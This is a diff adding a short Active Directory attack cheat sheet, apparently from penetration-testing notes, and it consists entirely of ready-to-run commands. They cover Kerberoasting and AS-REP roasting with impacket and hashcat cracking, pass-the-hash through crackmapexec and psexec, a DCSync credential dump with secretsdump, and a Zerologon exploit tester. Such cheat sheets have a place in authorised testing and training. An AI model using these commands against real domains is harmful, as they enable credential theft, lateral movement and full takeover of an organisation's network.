@@ -1,0 +1,18 @@
+AD SPECIFIC (if domain environment)
+bash# Kerberoasting
+impacket-GetUserSPNs domain.com/user:pass -dc-ip target -request
+hashcat -m 13100 hashes.txt rockyou.txt
+
+# ASREPRoasting (no preauth required)
+impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip target
+hashcat -m 18200 hashes.txt rockyou.txt
+
+# Pass the Hash
+crackmapexec smb target -u admin -H NTLM_HASH
+impacket-psexec -hashes :NTLM_HASH admin@target
+
+# DCSync (if DA)
+impacket-secretsdump domain/user:pass@dc_ip -just-dc
+
+# Zerologon (CVE-2020-1472)
+python3 zerologon_tester.py DC_NAME target_ip
